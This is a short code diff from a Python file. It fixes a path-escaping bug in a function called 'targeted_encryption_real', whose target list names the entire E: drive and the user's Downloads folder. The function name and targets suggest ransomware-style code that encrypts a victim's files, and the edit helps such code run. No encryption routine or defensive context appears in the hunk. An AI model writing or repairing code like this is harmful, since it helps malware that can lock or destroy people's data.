@@ -202,7 +202,7 @@ def targeted_encryption_real():
     
     # TARGETS: New Volume E + Downloads
     targets = [
-        r"E:\",  # New Volume E (Partisi Windows)
+        r"E:\\",  # New Volume E (Partisi Windows)
         os.path.join(os.path.expanduser("~"), "Downloads")  # Downloads
     ]
     
